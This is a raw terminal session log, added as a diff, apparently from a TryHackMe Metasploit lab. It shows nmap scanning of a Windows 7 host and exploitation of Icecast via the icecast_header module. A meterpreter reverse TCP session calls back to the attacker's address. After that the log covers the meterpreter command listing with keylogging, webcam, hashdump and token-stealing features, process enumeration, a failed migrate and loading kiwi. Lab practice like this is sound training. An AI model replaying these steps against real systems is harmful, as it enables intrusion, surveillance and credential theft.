@@ -1,0 +1,904 @@
+Script started on 2020-10-31 21:55:19-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# exitmsfconsole[6Pexitcat cat [3Plearat cat [4Pexitmsfconsole[6Pexit[Knetstat -nlpt
+Conexões Internet Ativas (sem os servidores)
+Proto Recv-Q Send-Q Endereço Local          Endereço Remoto         Estado      PID/Program name    
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# 
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# service postgresql start
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# 
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# service postgresql start[11Pnetstat -nlpt
+Conexões Internet Ativas (sem os servidores)
+Proto Recv-Q Send-Q Endereço Local          Endereço Remoto         Estado      PID/Program name    
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               OUÇA       2687/postgres       
+tcp        0      0 127.0.0.1:5433          0.0.0.0:*               OUÇA       2686/postgres       
+tcp6       0      0 ::1:5432                :::*                    OUÇA       2687/postgres       
+tcp6       0      0 ::1:5433                :::*                    OUÇA       2686/postgres       
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# 
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# 
+]0;root@Pentest: /home/joaof/TryJao/TryHackMe/Metasploit[1;31mroot@Pentest[00m:[1;34m/home/joaof/TryJao/TryHackMe/Metasploit[00m# msfconsole
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\                                                  
+[0m[36m
+                            _...----.
+                          .'    .-'`
+                        ,''--..;
+                       /       |
+               _______/________|_______
+              `-----/// _\  /_ \\\-----`
+                .---./ / o\/o \ \.---.
+               <(_ /// \__/\__/ \\\ _)>   _.---.
+                '-. //    oo    \\ .-'  .'   .__`\
+             o    /// __..--..__ \\\   /       \`\|
+          o-'*'-o //| '\/\/\/\/' |\\  /         ; '
+          \*\|/*/   ;--. """"  .-;   |   _   _  |
+         .-'---'-. / \|||-....(|||`\ |  (o) (o) |
+        /         \ /\           /\|/           |
+        |  .---,  |/  \         /  ;  '         |
+        | / e e \ |    '.     .'   |   '-.       \
+         \|  ^  |/       '---'     |              \_
+         ()._-_.()     T R I C K   |     .._.----/` \
+        ,/\'._.'/\. '  .           |    /   ``"-/||\ \
+       / \/     \/ \     O R       |   |            `7,
+      |  ^^_____^^  |              | . /// _          |
+      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |
+      \| '._____.' |/             /  \-|  |_)/ \ _    |
+       |::         | '.__     __,;    `|     \_// \   |
+       |::         |     `````   |     |        \_/  ;
+       |::         |             |      \           /
+       \::.        /_____________|       ``'--..___/
+        '._______.' '-|   |   |-'                 |
+          |_ | _|     |   |   |               __.-;
+          \  |  /     /-._|_.-\                    \
+           \_|_/     /`'-.|.-'`\                   /
+     jgs  /--T--\   /    .'.    \'-..____.---''''``
+         (__/ \__)  \____/  \___/
+
+[0m
+
+       =[ [33mmetasploit v5.0.101-dev[0m                         ]
++ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Open an interactive Ruby terminal with [32mirb[0m
+
+[?1034h[4mmsf5[0m [0m> msfdb init
+[0m[1m[34m[*][0m exec: msfdb init
+
+[01;33m[i][00m Database already started
+[01;33m[i][00m The database appears to be already configured, skipping initialization
+[4mmsf5[0m [0m> msfdb status
+[0m[1m[34m[*][0m exec: msfdb status
+
+[0;1;32m●[0m postgresql.service - PostgreSQL RDBMS
+     Loaded: loaded (]8;;file://Pentest/lib/systemd/system/postgresql.service/lib/systemd/system/postgresql.service]8;;; disabled; vendor preset: disabled)
+     Active: [0;1;32mactive (exited)[0m since Sat 2020-10-31 21:55:39 -03; 36s ago
+    Process: 2722 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+   Main PID: 2722 (code=exited, status=0/SUCCESS)
+
+out 31 21:55:39 Pentest systemd[1]: Starting PostgreSQL RDBMS...
+out 31 21:55:39 Pentest systemd[1]: Finished PostgreSQL RDBMS.
+
+COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+postgres 2687 postgres    3u  IPv6  48099      0t0  TCP localhost:5432 (LISTEN)
+postgres 2687 postgres    4u  IPv4  48100      0t0  TCP localhost:5432 (LISTEN)
+
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+postgres    2687       1  0 21:55 ?        Ss     0:00 /usr/lib/postgresql/12/bin/postgres -D /var/lib/postgresql/12/main -c config_file=/etc/postgresql/12/main/postg
+
+[01;32m[+][00m Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> hosts
+[0m
+Hosts
+=====
+
+address  mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------  ---  ----  -------  ---------  -----  -------  ----  --------
+
+[4mmsf5[0m [0m> vulns
+[0m
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+
+[4mmsf5[0m [0m> db_nampe[K[K[K[Kmap -sV 10.10.98.174
+[0m[1m[34m[*][0m Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-31 21:57 -03
+[1m[34m[*][0m Nmap: Nmap scan report for 10.10.98.174
+[1m[34m[*][0m Nmap: Host is up (0.27s latency).
+[1m[34m[*][0m Nmap: Not shown: 988 closed ports
+[1m[34m[*][0m Nmap: PORT      STATE SERVICE      VERSION
+[1m[34m[*][0m Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+[1m[34m[*][0m Nmap: 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[1m[34m[*][0m Nmap: 3389/tcp  open  tcpwrapped
+[1m[34m[*][0m Nmap: 5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[1m[34m[*][0m Nmap: 8000/tcp  open  http         Icecast streaming media server
+[1m[34m[*][0m Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 49159/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
+[1m[34m[*][0m Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[1m[34m[*][0m Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[1m[34m[*][0m Nmap: Nmap done: 1 IP address (1 host up) scanned in 76.23 seconds
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> hosts
+[0m
+Hosts
+=====
+
+address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.98.174             Unknown                    device         
+
+[4mmsf5[0m [0m> vulns
+[0m
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+
+[4mmsf5[0m [0m> ports
+[0m[1m[31m[-][0m Unknown command: ports.
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> hosts
+[0m
+Hosts
+=====
+
+address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.98.174             Unknown                    device         
+
+[4mmsf5[0m [0m> services
+[0mServices
+========
+
+host          port   proto  name          state  info
+----          ----   -----  ----          -----  ----
+10.10.98.174  135    tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
+10.10.98.174  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
+10.10.98.174  3389   tcp    tcpwrapped    open   
+10.10.98.174  5357   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+10.10.98.174  8000   tcp    http          open   Icecast streaming media server
+10.10.98.174  49152  tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  49153  tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  49154  tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  49158  tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  49159  tcp    msrpc         open   Microsoft Windows RPC
+10.10.98.174  49160  tcp    msrpc         open   Microsoft Windows RPC
+
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> vulns
+[0m
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+
+[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> use icr[Kecast
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/[45micecast[0m_header  2004-09-28       [32mgreat[0m  No     [45mIcecast[0m Header Overwrite
+
+
+[1m[34m[*][0m Using exploit/windows/http/icecast_header
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> search multi/handler
+[0m
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       [32mexcellent[0m  No     APT Package Manager Persistence
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       [32mexcellent[0m  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       [32mexcellent[0m  No     Yum Package Manager Persistence
+   6  exploit/[45mmulti/handler[0m                                                 manual     No     Generic Payload Handler
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       [32mexcellent[0m  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       [32mgreat[0m      No     Microsoft SQL Server Database Link Crawling Command Execution
+
+
+Interact with a module by name or index, for example [32muse 8[0m or [32muse exploit/windows/mssql/mssql_linkcrawler[0m
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use 6
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> info
+[0m
+       Name: Generic Payload Handler
+     Module: exploit/multi/handler
+   Platform: Android, Apple_iOS, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi
+       Arch: x86, x86_64, x64, mips, mipsle, mipsbe, mips64, mips64le, ppc, ppce500v2, ppc64, ppc64le, cbea, cbea64, sparc, sparc64, armle, armbe, aarch64, cmd, php, tty, java, ruby, dalvik, python, nodejs, firefox, zarch, r
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Manual
+
+Provided by:
+  hdm <x@hdm.io>
+  bcook-r7
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Wildcard Target
+
+Check supported:
+  No
+
+Payload information:
+  Space: 10000000
+  Avoid: 0 characters
+
+Description:
+  This module is a stub that provides all of the features of the 
+  Metasploit payload system to exploits that have been launched 
+  outside of the framework.
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use 
+[0mUsage: use <name|term|index>
+
+Interact with a module by name or search term/index.
+If a module name is not found, it will be treated as a search term.
+An index from the previous search results can be selected if desired.
+
+Examples:
+  use exploit/windows/smb/ms17_010_eternalblue
+
+  use eternalblue
+  use <name|index>
+
+  search eternalblue
+  use <name|index>
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use 6
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show option
+[0m[1m[31m[-][0m Invalid parameter "option", use "show -h" for more information
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show op[Kptions
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set payload windows/e[Kmt[Keterpreter/reverse_tp[Kcp
+[0mpayload => windows/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show optons[K[K[Kions
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> search icecast
+[0m
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/[45micecast[0m_header  2004-09-28       [32mgreat[0m  No     [45mIcecast[0m Header Overwrite
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use 0
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> show options
+[0m
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.19     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set e[Krhost [Ks 10.10.98.174
+[0mrhosts => 10.10.98.174
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> s[Kshow options
+[0m
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.98.174     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.19     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> e[Krun -k[Kj
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 192.168.0.19:4444 
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> se[K[K
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> show options
+[0m
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.98.174     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> run -j
+[0m[1m[34m[*][0m Exploit running as background job 1.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> [1m[34m[*][0m Sending stage (176195 bytes) to 10.10.98.174
+[1m[34m[*][0m Meterpreter session 1 opened (10.9.185.104:4444 -> 10.10.98.174:49205) at 2020-10-31 22:16:41 -0300
+[0m[0m
+[0m[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.185.104:4444 -> 10.10.98.174:49205 (10.10.98.174)
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> jobs
+[0m
+Jobs
+====
+
+No active jobs.
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessiobn[K[Kn -i 1
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions [K[Ks -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > sysinfo
+[0mComputer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user's desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]                                   
+ 4     0     System                                             
+ 356   692   svchost.exe                                        
+ 416   4     smss.exe                                           
+ 544   536   csrss.exe                                          
+ 584   692   svchost.exe                                        
+ 592   536   wininit.exe                                        
+ 604   584   csrss.exe                                          
+ 652   584   winlogon.exe                                       
+ 692   592   services.exe                                       
+ 700   592   lsass.exe                                          
+ 708   592   lsm.exe                                            
+ 816   692   svchost.exe                                        
+ 884   692   svchost.exe                                        
+ 932   692   svchost.exe                                        
+ 1020  692   svchost.exe                                        
+ 1056  692   svchost.exe                                        
+ 1136  692   svchost.exe                                        
+ 1204  816   WmiPrvSE.exe                                       
+ 1328  692   spoolsv.exe                                        
+ 1336  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1360  1308  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1400  692   svchost.exe                                        
+ 1432  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1576  692   amazon-ssm-agent.exe                               
+ 1592  1940  WinSAT.exe            x64   1                      
+ 1652  692   LiteAgent.exe                                      
+ 1664  692   sppsvc.exe                                         
+ 1688  692   svchost.exe                                        
+ 1832  692   Ec2Config.exe                                      
+ 1940  692   taskhost.exe          x64   1                      
+ 2000  692   TrustedInstaller.exe                               
+ 2084  692   svchost.exe                                        
+ 2244  1360  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2296  692   vds.exe                                            
+ 2472  544   conhost.exe                                        
+ 2564  692   SearchIndexer.exe                                  
+ 2924  1020  Defrag.exe                                         
+ 2968  604   conhost.exe           x64   1                      
+
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > migrate 1328
+[0m[1m[34m[*][0m Migrating from 2244 to 1328...
+[1m[31m[-][0m Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > sysinfo
+[0mComputer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: Dark-PC\Dark
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > load kiwi
